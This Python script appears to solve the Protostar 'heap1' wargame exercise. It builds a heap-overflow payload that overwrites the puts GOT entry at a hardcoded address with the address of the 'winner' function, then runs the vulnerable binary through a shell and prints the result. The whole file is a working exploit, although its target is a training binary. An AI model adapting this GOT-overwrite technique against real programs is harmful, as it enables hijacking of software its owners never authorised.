#!/usr/bin/env python
#-*- coding: utf-8 -*-

import sys
import struct
import subprocess
import re

if len(sys.argv) == 4:
    binary = sys.argv[1]
    var_name = sys.argv[2]
    nopsn = int(sys.argv[3])
else:
    binary = '/opt/protostar/bin/heap1'
    var_name = 'winner'
    nopsn = 20

def find_var_addr(binary, var_name):
    hex_regex = re.compile('^0x[0-9A-Fa-f]{8}')
    if hex_regex.match(var_name):
        return int(var_name[2:].strip(), base=16)
    addr = 0
    p1 = subprocess.Popen(["objdump", "-D", binary], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(["grep", "-m", "1", '<'+var_name+'>'], 
                          stdin=p1.stdout, stdout=subprocess.PIPE)
    p3 = subprocess.Popen(["awk", "{FS = \" \"; print $1}" ], 
                          stdin=p2.stdout, stdout=subprocess.PIPE)
    p1.stdout.close()
    p2.stdout.close()
    res = p3.communicate()[0]
    if not res:
        print('[-] Variable not found. Note that this only works for variables ' \
              '(not functions). We search objdump output for \"<var_name>\"')
        exit()
    addr = int(res.strip(), base=16)
    return addr
# FUUUUUUUU dtors does not work. ¡¡Fuck gcc!! 1 hour wasted!
#where = '__DTOR_END__'
#addr1 = find_var_addr(binary, where)
where = 'puts@plt'
addr1 = 0x8049774
print('[+] Address to write in ({0}) = {1}'.format(where, hex(addr1)))
addr2 = find_var_addr(binary, var_name)
print('[+] Address to be written ({0}) = {1}'.format(var_name, hex(addr2)))

payload1 = 'A' * nopsn
payload1 += struct.pack('<L', addr1)

payload2 = struct.pack('<L', addr2)

with open('payload', 'w') as fd1:
    fd1.write(payload1  + ' ' + payload2)

fd2 = open('out', 'w')
cmd = binary + ' ' + payload1 + ' ' + payload2
print('[+] Command: {0}'.format(cmd))
p1 = subprocess.Popen(cmd, stdin=subprocess.PIPE, 
    stdout=fd2, stderr=fd2, shell=True)
print('[+] Output written in \"out\" file.')

p = subprocess.Popen('cat out', stdin=subprocess.PIPE, 
stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
res = p.communicate()[0]
print('[+] \'out\' file contents: ')
print(res)

#p1 = subprocess.Popen([binary], stdin=open('payload', 'r'), 
#stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
#res = p1.communicate()
#print(res)
